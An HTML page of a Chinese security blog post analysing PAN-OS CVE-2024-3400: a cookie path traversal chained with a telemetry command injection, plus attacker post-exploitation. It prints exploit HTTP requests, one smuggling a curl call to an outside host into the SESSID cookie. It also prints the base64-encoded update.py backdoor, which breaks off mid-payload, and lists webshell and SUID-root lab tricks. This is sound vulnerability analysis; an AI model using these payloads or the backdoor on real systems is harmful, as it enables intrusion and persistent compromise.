<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.loli.net/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Path Traversal,Command Injection,">





  <link rel="alternate" href="/atom.xml" title="程序人生" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">






<meta name="description" content="本文整理了网上关于 PAN-OS 在野攻击漏洞 CVE-2024-3400 的各种技术细节信息，包括 Cookie 中的路径穿越漏洞和 Telemetry 中的命令注入漏洞的组合利用，以及攻击者 Post-Exploitation 相关的细节信息。此外，Bishop Fox 发现了新的命令注入漏洞，因此带有漏洞的系统仅仅是禁用 Telemetry 服务是没有用的。">
<meta name="keywords" content="Path Traversal,Command Injection">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2024-3400 PAN-OS 路径穿越&amp;命令注入漏洞利用">
<meta property="og:url" content="https://programlife.net/2024/04/21/cve-2024-3400-panos-path-traversal-and-command-injection-vulnerability/index.html">
<meta property="og:site_name" content="程序人生">
<meta property="og:description" content="本文整理了网上关于 PAN-OS 在野攻击漏洞 CVE-2024-3400 的各种技术细节信息，包括 Cookie 中的路径穿越漏洞和 Telemetry 中的命令注入漏洞的组合利用，以及攻击者 Post-Exploitation 相关的细节信息。此外，Bishop Fox 发现了新的命令注入漏洞，因此带有漏洞的系统仅仅是禁用 Telemetry 服务是没有用的。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://programlife.net/uploads/202404/cve-2024-3400-panos-disable-telemetry-never-works.webp">
<meta property="og:updated_time" content="2024-04-20T16:30:19.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2024-3400 PAN-OS 路径穿越&amp;命令注入漏洞利用">
<meta name="twitter:description" content="本文整理了网上关于 PAN-OS 在野攻击漏洞 CVE-2024-3400 的各种技术细节信息，包括 Cookie 中的路径穿越漏洞和 Telemetry 中的命令注入漏洞的组合利用，以及攻击者 Post-Exploitation 相关的细节信息。此外，Bishop Fox 发现了新的命令注入漏洞，因此带有漏洞的系统仅仅是禁用 Telemetry 服务是没有用的。">
<meta name="twitter:image" content="https://programlife.net/uploads/202404/cve-2024-3400-panos-disable-telemetry-never-works.webp">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://programlife.net/2024/04/21/cve-2024-3400-panos-path-traversal-and-command-injection-vulnerability/">





  <title>CVE-2024-3400 PAN-OS 路径穿越&命令注入漏洞利用 | 程序人生</title>
  














</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">程序人生</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Fuzzing / Vulnerability / Exploit</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://programlife.net/2024/04/21/cve-2024-3400-panos-path-traversal-and-command-injection-vulnerability/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ke Liu">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.webp">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="程序人生">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2024-3400 PAN-OS 路径穿越&命令注入漏洞利用</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-04-21T13:33:37+00:00">
                2024-04-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerability/" itemprop="url" rel="index">
                    <span itemprop="name">Vulnerability</span>
                  </a>
                </span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerability/Analysis/" itemprop="url" rel="index">
                    <span itemprop="name">Analysis</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>本文整理了网上关于 PAN-OS 在野攻击漏洞 CVE-2024-3400 的各种技术细节信息，包括 <strong>Cookie 中的路径穿越漏洞</strong>和 <strong>Telemetry 中的命令注入漏洞</strong>的组合利用，以及攻击者 Post-Exploitation 相关的细节信息。此外，Bishop Fox 发现了新的命令注入漏洞，因此带有漏洞的系统仅仅是禁用 Telemetry 服务是没有用的。</p>
<a id="more"></a>
<p>因为没有漏洞复现环境，本文仅仅是基于信息整理写的一篇笔记，如果你关注的是如何搭建复现环境，可以参考 <a href="#2-1-漏洞信息"><strong>2.1 漏洞信息</strong></a> 中引用的文章链接。</p>
<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01. 漏洞简介"></a>0x01. 漏洞简介</h2><p>Volexity Threat Research 在 2024-04-10 捕获的针对 PAN-OS 设备的在野攻击漏洞利用，Palo Alto Networks 在 2024-04-11 发布安全公告并分配 CVE 编号 CVE-2024-3400。</p>
<p>虽然只有一个 CVE 编号，但实际上在野攻击使用了两个漏洞：</p>
<ul>
<li>SSL VPN Cookie 解析路径穿越漏洞，在未登录的情况下可以以 <code>root</code> 权限创建任意文件（空文件）</li>
<li>Telemetry 命令注入漏洞，配合上述文件名实现代码执行</li>
</ul>
<p>组合利用即可达到无需登录即可实现远程任意代码执行的效果。</p>
<p>Telemetry 命令注入漏洞依赖于 Telemetry 服务的开启，但是也可以组合利用其他不需要前置条件的命令注入漏洞，比如 Bishop Fox 提到他们发现并报告了一个新的且不依赖于 Telemetry 的命令注入漏洞（当前暂无公开细节信息）。</p>
<h2 id="0x02-漏洞细节"><a href="#0x02-漏洞细节" class="headerlink" title="0x02. 漏洞细节"></a>0x02. 漏洞细节</h2><h3 id="2-1-漏洞信息"><a href="#2-1-漏洞信息" class="headerlink" title="2.1 漏洞信息"></a>2.1 漏洞信息</h3><blockquote>
<p>A command injection as a result of arbitrary file creation vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.</p>
</blockquote>
<p><strong>研究这类漏洞最大的障碍就是复现环境搭建</strong>，因为厂商不对非客户开放虚拟机镜像下载权限 :-(</p>
<ul>
<li><a href="https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">watchTowr Labs: Palo Alto - Putting The Protecc In GlobalProtect (CVE-2024-3400)</a> 的方法是去 AWS Marketplace 申请一个对应的 AWS 虚拟机实例，但是带漏洞的 PAN-OS 版本随时会被下架</li>
<li><a href="https://www.sprocketsecurity.com/resources/patch-diffing-cve-2024-3400-from-a-palo-alto-ngfw-marketplace-ami" target="_blank" rel="noopener">Sprocket Security: Patch Diffing CVE-2024-3400 from a Palo Alto NGFW Marketplace AMI</a> 指出了 AWS 虚拟机示例对 PAN-OS 进行降级的方法</li>
</ul>
<p>除了拿到虚拟机镜像外，获取 <code>root</code> 权限也是一个比较重要的操作，<a href="https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysis" target="_blank" rel="noopener">Rapid7</a> 的文章给出了一个比较简单的解决方案：</p>
<ul>
<li>系统启动时对 <code>/var</code> 没有完整性校验</li>
<li>挂载虚拟机磁盘在 <code>/var/appweb/htdocs/unauth/php</code> 插入一个 PHP WebShell</li>
<li>编译一个 SUID-root 程序配合 PHP WebShell 以 <code>root</code> 权限执行命令</li>
<li>以 <code>root</code> 权限修改 <code>/etc/passwd</code> 实现 SSH 拿到 <code>root</code> Shell</li>
</ul>
<p>类似的技巧在看雪上也有讨论分享：<a href="https://bbs.kanxue.com/thread-281287.htm" target="_blank" rel="noopener">获取虚拟机的shell</a>。</p>
<h3 id="2-2-Cookie-路径穿越"><a href="#2-2-Cookie-路径穿越" class="headerlink" title="2.2 Cookie 路径穿越"></a>2.2 Cookie 路径穿越</h3><p>SSL VPN 的页面 <code>/ssl-vpn/hipreport.esp</code> 在解析 Cookie SESSID 时存在<strong>路径穿越漏洞</strong>（<a href="https://programlife.net/tags/Path-Traversal/">Path Traversal Vulnerability</a>），且该页面不需要登录就可以访问。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ssl-vpn/hipreport.esp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: &lt;Hostname&gt;</span><br><span class="line"><span class="attribute">Cookie</span>: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/watchtowr.txt;</span><br></pre></td></tr></table></figure>
<p>触发漏洞后，如果对应的文件不存在，将会以 <code>root</code> 权限创建一个空文件。</p>
<h3 id="2-3-Telemetry-命令注入"><a href="#2-3-Telemetry-命令注入" class="headerlink" title="2.3 Telemetry 命令注入"></a>2.3 Telemetry 命令注入</h3><p>PAN-OS 的 Telemetry 服务会定时将指定文件夹下的日志文件回传给 Palo Alto Networks 的服务器，而这里相关的一个 Python 文件 <code>/p2/usr/local/bin/dt_curl</code> 存在<strong>命令注入漏洞</strong>（<a href="https://programlife.net/tags/Command-Injection/">Command Injection Vulnerability</a>），关键代码如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> source_ip_str <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> source_ip_str != <span class="string">""</span>: </span><br><span class="line">    curl_cmd = <span class="string">"/usr/bin/curl -v -H \"Content-Type: application/octet-stream\" -X PUT \"%s\" --data-binary @%s --capath %s --interface %s"</span> \</span><br><span class="line">                 %(signedUrl, fname, capath, source_ip_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    curl_cmd = <span class="string">"/usr/bin/curl -v -H \"Content-Type: application/octet-stream\" -X PUT \"%s\" --data-binary @%s --capath %s"</span> \</span><br><span class="line">                 %(signedUrl, fname, capath)</span><br><span class="line"><span class="keyword">if</span> dbg:</span><br><span class="line">    logger.info(<span class="string">"S2: XFILE: send_file: curl cmd: '%s'"</span> %curl_cmd)</span><br><span class="line">stat, rsp, err, pid = pansys(curl_cmd, shell=<span class="keyword">True</span>, timeout=<span class="number">250</span>)</span><br></pre></td></tr></table></figure>
<p>留意 <code>fname</code> 和 <code>shell=True</code></p>
<ul>
<li><code>fname</code> 即为本地文件路径，可以是前面 Cookie SESSID 解析路径穿越漏洞所创建的文件</li>
<li><code>pansys(curl_cmd, shell=True, timeout=250)</code> 表明很有可能注入的参数会被当做命令来执行</li>
</ul>
<p><code>pansys</code> 最终调用 <code>/p2/lib64/python3.6/site-packages/pansys/pansys.py</code> 中的 <code>pansys.dosys()</code>，相关代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dosys</span><span class="params">(self, command, close_fds=True, shell=False, timeout=<span class="number">30</span>, first_wait=None)</span>:</span></span><br><span class="line">    <span class="string">"""call shell-command and either return its output or kill it</span></span><br><span class="line"><span class="string">       if it doesn't normally exit within timeout seconds"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Define dosys specific constants here</span></span><br><span class="line">    PANSYS_POST_SIGKILL_RETRY_COUNT = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># how long to pause between poll-readline-readline cycles</span></span><br><span class="line">    PANSYS_DOSYS_PAUSE = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Use first_wait if time to complete is lengthy and can be estimated </span></span><br><span class="line">    <span class="keyword">if</span> first_wait == <span class="keyword">None</span>:</span><br><span class="line">        first_wait = PANSYS_DOSYS_PAUSE</span><br><span class="line"></span><br><span class="line">    <span class="comment"># restrict the maximum possible dosys timeout</span></span><br><span class="line">    PANSYS_DOSYS_MAX_TIMEOUT = <span class="number">23</span> * <span class="number">60</span> * <span class="number">60</span></span><br><span class="line">    <span class="comment"># Can support upto 2GB per stream</span></span><br><span class="line">    out = StringIO()</span><br><span class="line">    err = StringIO()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> shell:</span><br><span class="line">            cmd = command</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cmd = command.split()</span><br><span class="line">    <span class="keyword">except</span> AttributeError: cmd = command</span><br><span class="line"></span><br><span class="line">    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, bufsize=<span class="number">1</span>, shell=shell,</span><br><span class="line">             stderr=subprocess.PIPE, close_fds=close_fds, universal_newlines=<span class="keyword">True</span>)</span><br><span class="line">    timer = pansys_timer(timeout, PANSYS_DOSYS_MAX_TIMEOUT)</span><br></pre></td></tr></table></figure>
<p><code>shell=True</code> 最终会传递到 <code>subprocess.Popen()</code>，即创建一个 Shell 来执行命令，那么前面通过 <code>fname</code> 注入的代码就可以被执行了。</p>
<h3 id="2-4-组合利用"><a href="#2-4-组合利用" class="headerlink" title="2.4 组合利用"></a>2.4 组合利用</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ssl-vpn/hipreport.esp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: &lt;Hostname&gt;</span><br><span class="line"><span class="attribute">Cookie</span>: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere`curl$&#123;IFS&#125;x1.outboundhost.com`;</span><br></pre></td></tr></table></figure>
<p>命令注入的常规操作技巧：</p>
<ul>
<li><code>`</code> 用来执行命令</li>
<li><code>${IFS}</code> 用来绕过空格限制</li>
</ul>
<h3 id="2-5-其他说明"><a href="#2-5-其他说明" class="headerlink" title="2.5 其他说明"></a>2.5 其他说明</h3><p><a href="https://github.com/gorilla/sessions/pull/274" target="_blank" rel="noopener">gorilla/sessions Pull Requests - Improve File System Path Handling #274</a> 在讨论前面提到的路径穿越漏洞是否是 gorilla/sessions 自带的漏洞，结论是：</p>
<ul>
<li>并非 gorilla/sessions 的漏洞</li>
<li>是 Palo Alto Networks 在实现 <code>SessDiskStore</code> 时存在的漏洞</li>
</ul>
<blockquote>
<p>The Palo Alto vulnerability described in <a href="https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/</a> seems to be in a different internal Store implementation called SessDiskStore, which works similarly (maybe derived from FilesystemStore) but does not authenticate the session ID.</p>
</blockquote>
<p>此外，Telemetry 中的命令注入漏洞需要在开启 Telemetry 功能的情况下才能触发，最开始 Palo Alto Networks 的安全公告也说了这个前置条件，但是后面更新时又去掉了这个条件。</p>
<blockquote>
<p>This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both). <strong>Device telemetry does not need to be enabled</strong> for PAN-OS firewalls to be exposed to attacks related to this vulnerability.</p>
</blockquote>
<p>在未开启 Telemetry 的情况下是否能达到类似命令注入的利用效果？目前暂时没有公开的细节信息，但是 Bishop Fox 在文章 <a href="https://bishopfox.com/blog/pan-os-cve-2024-3400-patch-your-palo-alto-firewalls" target="_blank" rel="noopener">PAN-OS CVE-2024-3400: Patch Your Palo Alto Firewalls</a> 提到他们发现了一个新的且不依赖于 Telemetry 的命令注入漏洞，在他们将细节报告给 Palo Alto Networks 之后，PAN 才更新了漏洞公告信息。</p>
<blockquote>
<p>We developed bypasses for both recommended interim mitigations. We were able to successfully evade Threat Prevention signatures, and we identified a new command injection vulnerability which is exploitable even when device telemetry is disabled.</p>
</blockquote>
<p><img src="/uploads/202404/cve-2024-3400-panos-disable-telemetry-never-works.webp" alt="CVE-2024-3400 PANOS Disable Telemetry Never Works"></p>
<h2 id="0x03-Post-Exploitation"><a href="#0x03-Post-Exploitation" class="headerlink" title="0x03. Post-Exploitation"></a>0x03. Post-Exploitation</h2><p>Volexity Threat Research 在文章 <a href="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener">Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)</a> 中给出了攻击行动的一些具体细节信息。</p>
<h3 id="3-1-update-py-backdoor"><a href="#3-1-update-py-backdoor" class="headerlink" title="3.1 update.py backdoor"></a>3.1 update.py backdoor</h3><blockquote>
<p>Zero-day exploitation of a vulnerability in Palo Alto Global Protect firewall devices that allowed for unauthenticated remote code execution to take place. Initial exploitation was used to create a reverse shell, download tools, exfiltrate configuration data, and move laterally within the network.</p>
</blockquote>
<p><code>update.py</code> 可以从 <a href="https://bazaar.abuse.ch/sample/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac/" target="_blank" rel="noopener">MalwareBazaar</a> 下载到，源码如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,base64,time</span><br><span class="line">systempth = <span class="string">"/usr/lib/python3.6/site-packages/system.pth"</span></span><br><span class="line"><span class="keyword">with</span> open(systempth,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'''import base64;exec(base64.b64decode(b"CgoKZGVmIGNoZWNrKCk6CiAgICBpbXBvcnQgb3Msc3VicHJvY2Vzcyx0aW1lLHN5cwoKCiAgICBkZWYgc3RhcnRfcHJvY2VzcygpOgogICAgICAgIGltcG9ydCBiYXNlNjQKICAgICAgICBmdW5jdGlvbmNvZGUgPSBiIlpHVm1JRjlmYldGcGJpZ3BPZzBLSUNBZ0lHbHRjRzl5ZENCMGFISmxZV1JwYm1jc2RHbHRaU3h2Y3l4eVpTeGlZWE5sTmpRTkNnMEtEUW9OQ2lBZ0lDQmtaV1lnY21WemRHOXlaU2hqYzNOZmNHRjBhQ3hqYjI1MFpXNTBMR0YwYVcxbExHMTBhVzFsS1RvTkNpQWdJQ0FnSUNBZ2FXMXdiM0owSUc5ekxIUnBiV1VOQ2lBZ0lDQWdJQ0FnZEdsdFpTNXpiR1ZsY0NneE5Ta05DaUFnSUNBZ0lDQWdkMmwwYUNCdmNHVnVLR056YzE5d1lYUm9MQ2QzSnlrZ1lYTWdaam9OQ2lBZ0lDQWdJQ0FnSUNBZ0lHWXVkM0pwZEdVb1kyOXVkR1Z1ZENrTkNpQWdJQ0FnSUNBZ2IzTXVkWFJwYldVb1kzTnpYM0JoZEdnc0tHRjBhVzFsTEcxMGFXMWxLU2tOQ2lBZ0lDQWdJQ0FnRFFvTkNpQWdJQ0FnSUNBZ0RRb2dJQ0FnWkdWbUlGOWZhWE5mZDJodmJHVmZhRzkxY2lncE9nMEtJQ0FnSUNBZ0lDQm1jbTl0SUdSaGRHVjBhVzFsSUdsdGNHOXlkQ0JrWVhSbGRHbHRaUTBLSUNBZ0lDQWdJQ0JqZFhKeVpXNTBYM1JwYldVZ1BTQmtZWFJsZEdsdFpTNXViM2NvS1M1MGFXMWxLQ2tOQ2lBZ0lDQWdJQ0FnY21WMGRYSnVJR04xY25KbGJuUmZkR2x0WlM1dGFXNTFkR1VnSVQwZ01DQmhibVFnWTNWeWNtVnVkRjkwYVcxbExuTmxZMjl1WkNBOVBTQXdEUW9nSUNBZ1kzTnpYM0JoZEdnZ1BTQW5MM1poY2k5aGNIQjNaV0l2YzNOc2RuQnVaRzlqY3k5bmJHOWlZV3d0Y0hKdmRHVmpkQzl3YjNKMFlXd3ZZM056TDJKdmIzUnpkSEpoY0M1dGFXNHVZM056SncwS0lDQWdJR052Ym5SbGJuUWdQU0J2Y0dWdUtHTnpjMTl3WVhSb0tTNXlaV0ZrS0NrTkNpQWdJQ0JoZEdsdFpUMXZjeTV3WVhSb0xtZGxkR0YwYVcxbEtHTnpjMTl3WVhSb0tRMEtJQ0FnSUcxMGFXMWxQVzl6TG5CaGRHZ3VaMlYwYlhScGJXVW9ZM056WDNCaGRHZ3BEUW9OQ2lBZ0lDQjNhR2xzWlNCVWNuVmxPZzBLSUNBZ0lDQWdJQ0IwY25rNkRRb2dJQ0FnSUNBZ0lDQWdJQ0JUU0VWTVRGOVFRVlJVUlZKT0lEMGdKMmx0WjF4YktGdGhMWHBCTFZvd0xUa3JMejFkS3lsY1hTY05DaUFnSUNBZ0lDQWdJQ0FnSUd4cGJtVnpJRDBnVzEwTkNpQWdJQ0FnSUNBZ0lDQWdJRmRTU1ZSRlgwWk1RVWNnUFNCR1lXeHpaUTBLSUNBZ0lDQWdJQ0FnSUNBZ1ptOXlJR3hwYm1VZ2FXNGdiM0JsYmlnaUwzWmhjaTlzYjJjdmNHRnVMM056Ykhad2JsOXVaM2hmWlhKeWIzSXViRzluSWl4bGNuSnZjbk05SW1sbmJtOXlaU0lwTG5KbFlXUnNhVzVsY3lncE9nMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lISnpkQ0E5SUhKbExuTmxZWEpqYUNoVFNFVk1URjlRUVZSVVJWSk9MR3hwYm1VcERRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdjbk4wT2cwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQlhVa2xVUlY5R1RFRkhJRDBnVkhKMVpRMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JqYldRZ1BTQmlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtISnpkQzVuY205MWNDZ3hLU2t1WkdWamIyUmxLQ2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2RISjVPZzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdiM1YwY0hWMElEMGdiM011Y0c5d1pXNG9ZMjFrS1M1eVpXRmtLQ2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSGRwZEdnZ2IzQmxiaWhqYzNOZmNHRjBhQ3dpWVNJcElHRnpJR1k2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1ppNTNjbWwwWlNnaUx5b2lLMjkxZEhCMWRDc2lLaThpS1EwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmxlR05sY0hRZ1JYaGpaWEIwYVc5dUlHRnpJR1U2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J3WVhOekRRb05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWTI5dWRHbHVkV1VOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JzYVc1bGN5NWhjSEJsYm1Rb2JHbHVaU2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lHbG1JRmRTU1ZSRlgwWk1RVWM2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWVhScGJXVTliM011Y0dGMGFDNW5aWFJoZEdsdFpTZ2lMM1poY2k5c2IyY3ZjR0Z1TDNOemJIWndibDl1WjNoZlpYSnliM0l1Ykc5bklpa05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnRkR2x0WlQxdmN5NXdZWFJvTG1kbGRHMTBhVzFsS0NJdmRtRnlMMnh2Wnk5d1lXNHZjM05zZG5CdVgyNW5lRjlsY25KdmNpNXNiMmNpS1EwS0RRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2QybDBhQ0J2Y0dWdUtDSXZkbUZ5TDJ4dlp5OXdZVzR2YzNOc2RuQnVYMjVuZUY5bGNuSnZjaTVzYjJjaUxDSjNJaWtnWVhNZ1pqb05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWmk1M2NtbDBaV3hwYm1WektHeHBibVZ6S1EwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUc5ekxuVjBhVzFsS0NJdmRtRnlMMnh2Wnk5d1lXNHZjM05zZG5CdVgyNW5lRjlsY25KdmNpNXNiMmNpTENoaGRHbHRaU3h0ZEdsdFpTa3BEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdhVzF3YjNKMElIUm9jbVZoWkdsdVp3MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIUm9jbVZoWkdsdVp5NVVhSEpsWVdRb2RHRnlaMlYwUFhKbGMzUnZjbVVzWVhKbmN6MG9ZM056WDNCaGRHZ3NZMjl1ZEdWdWRDeGhkR2x0WlN4dGRHbHRaU2twTG5OMFlYSjBLQ2tOQ2lBZ0lDQWdJQ0FnWlhoalpYQjBPZzBLSUNBZ0lDQWdJQ0FnSUNBZ2NHRnpjdzBLSUNBZ0lDQWdJQ0IwYVcxbExuTnNaV1Z3S0RJcERRb05DZzBLYVcxd2IzSjBJSFJvY21WaFpHbHVaeXgwYVcxbERRcDBhSEpsWVdScGJtY3VWR2h5WldGa0tIUmhjbWRsZEQxZlgyMWhhVzRwTG5OMFlYSjBLQ2tOQ2cwSyIKICAgICAgICBleGVjKGJhc2U2NC5iNjRkZWNvZGUoZnVuY3Rpb25jb2RlKSkgICAgICAgIAoKICAgIGlmIGIiL3Vzci9sb2NhbC9iaW4vbW9uaXRvciBtcCIgaW4gb3BlbigiL3Byb2Mvc2VsZi9jbWRsaW5lIiwicmIiKS5yZWFkKCkucmVwbGFjZShiIlx4MDAiLGIiICIpIDoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHN0YXJ0X3Byb2Nlc3MoKQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdCBhcyBlOgogICAgICAgICAgICBwcmludChlKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZSkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxzZToKICAgICAgICByZXR1cm4gRmFsc2UgCgoKZGVmIHByb3RlY3QoKToKICAgIGltcG9ydCBvcyxzaWduYWwKICAgIHN5c3RlbXB0aCA9ICIvdXNyL2xpYi9weXRob24zLjYvc2l0ZS1wYWNrYW